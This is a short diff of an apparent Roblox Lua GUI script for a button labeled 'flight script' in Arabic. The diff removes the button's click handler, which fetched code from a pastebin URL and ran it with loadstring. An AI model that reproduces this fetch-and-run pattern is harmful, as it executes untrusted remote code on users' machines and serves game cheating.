@@ -32,9 +32,7 @@ Fly.Font = Enum.Font.SourceSans
 Fly.Text = "سكريت طيران"
 Fly.TextColor3 = Color3.fromRGB(0, 0, 0)
 Fly.TextSize = 14.000
-Fly.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet('https://pastebin.com/raw/YSL3xKYU'))()
-end)
+
 
 UICorner.Parent = Fly
 
